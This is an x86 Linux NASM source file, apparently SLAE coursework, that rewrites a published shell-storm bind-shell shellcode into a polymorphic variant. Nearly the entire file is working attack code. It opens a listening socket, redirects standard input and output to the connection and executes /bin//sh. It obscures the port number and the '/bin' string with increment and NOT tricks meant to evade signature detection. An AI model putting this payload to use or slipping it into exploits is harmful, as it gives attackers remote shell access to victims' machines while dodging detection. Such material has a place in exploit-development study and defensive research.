; Filename: poly_shellcode_672.nasm
; Author:  Samuel Dugo
; SLAE-ID:    SLAE-1376
; Size:       97 bytes (0%)
; Purpose: Polymorphic version of shellcode found on http://shell-storm/shellcode/files/shellcode-672.php

global _start			

section .text
_start:

;socket creation
	push   0x66
	push   0x1
	pop    ebx
	pop    eax
	cdq
	push   edx
	push   ebx
	push   0x2
	mov    ecx,esp
	int    0x80
;binding socket to port
	mov    esi,eax
	push   0x66
        pop    eax
	inc    ebx
	push   edx
	mov    di,0x15fd     ;port number plus one in network order 
	dec    edi           ;polymorph technique to get the desired port number
	push   edi
	push   bx
	mov    ecx,esp
	push   0x10
	push   ecx
	push   esi
	mov    ecx,esp
	int    0x80
;listening for incoming connections
        push   0x66
	inc    ebx
	inc    ebx
        pop    eax
	push   0x5
	push   esi
	int    0x80
;accepting incoming connections
        push   0x66
	inc    ebx
        pop    eax
	push   edx
	push   edx
	push   esi
	mov    ecx,esp
	int    0x80
;redirecting STDIN,STDOUT to the socket
;using this code is possible optimize the original code
	mov    ebx,eax
	push   0x2
        pop    ecx
dup_loop:
	push   0x3f
	pop    eax
	dec    ecx
	int    0x80
	jne    dup_loop
;launching the shell on the socket
	push   ecx            ;pushes null terminator
	mov    esi,0x68732f2e 
	inc    esi            ;esi is 0x68732f2f which means "hs//"
	push   esi
        mov    esi,0x91969DD0
        not    esi            ;esi is 0x6e69622f which means "nib/"
	push   esi
	mov    ebx,esp
	push   edx
	mov    al,0xb
	int    0x80